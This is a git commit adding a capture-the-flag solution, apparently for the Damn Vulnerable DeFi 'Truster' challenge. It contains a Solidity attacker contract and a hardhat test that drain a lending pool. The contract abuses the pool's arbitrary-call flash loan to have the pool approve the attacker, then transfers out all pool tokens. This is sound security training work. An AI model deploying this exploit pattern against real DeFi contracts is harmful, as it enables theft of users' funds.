c569cb22fee6bd180d818694d126276021675e6c
mj221 <mj@labrys.io>
2023-11-19 16:39:37 +1000

    feat: added solutions to the Truster challenge

---
+++ contracts/truster/TrusterLenderAttacker.sol
@@ -0,0 +1,28 @@
+import "./TrusterLenderPool.sol";
+
+/**
+ * @title TrusterLenderAttacker
+ * @author MJ
+ * @notice Baseline attacker contract for the TrustLenderPool.
+ */
+contract TrustLenderAttacker {
+    TrusterLenderPool public pool;
+    DamnValuableToken public token;
+
+    constructor(address _pool, address _token) {
+        pool = TrusterLenderPool(_pool);
+        token = DamnValuableToken(_token);
+    }
+
+    /**
+     * @notice Attack the TrusterLenderPool contract by approving a flash loan
+     * of all tokens in the pool to this contract, then transferring them
+     * out of the pool. This is possible because TrusterLenderPool allows arbitrary calls
+     */
+    function attack() public {
+        uint256 amount = token.balanceOf(address(pool));
+        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
+        pool.flashLoan(0, msg.sender, address(token), data);
+        token.transferFrom(address(pool), msg.sender, amount);
+    }
+}
--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,40 +1,55 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, player;
-    let token, pool;
+describe("[Challenge] Truster", function () {
+  let deployer, player;
+  let token, pool;
 
-    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
+  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, player] = await ethers.getSigners();
 
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
-        expect(await pool.token()).to.eq(token.address);
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
+    pool = await (
+      await ethers.getContractFactory("TrusterLenderPool", deployer)
+    ).deploy(token.address);
+    expect(await pool.token()).to.eq(token.address);
 
-        await token.transfer(pool.address, TOKENS_IN_POOL);
-        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+    await token.transfer(pool.address, TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(await token.balanceOf(player.address)).to.equal(0);
-    });
+    expect(await token.balanceOf(player.address)).to.equal(0);
+  });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+  /**
+   * NOTE: TrusterLenderPool is vulnerable to arbitrary calls being made through functionCall.
+   * This means that anyone can call any function on any contract with arbitrary parameters.
+   * This is a very common vulnerability in smart contracts.
+   * We simply need to approve all tokens to our malicious TrustLenderAttacker contract from the pool and transfer it all.
+   */
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    const trustLenderAttackContract = await ethers.getContractFactory(
+      "TrustLenderAttacker",
+      player
+    );
+    const trustLenderAttack = await trustLenderAttackContract.deploy(
+      pool.address,
+      token.address
+    );
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+    await trustLenderAttack.attack();
+  });
 
-        // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.equal(0);
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    // Player has taken all tokens from the pool
+    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(0);
+  });
 });
-
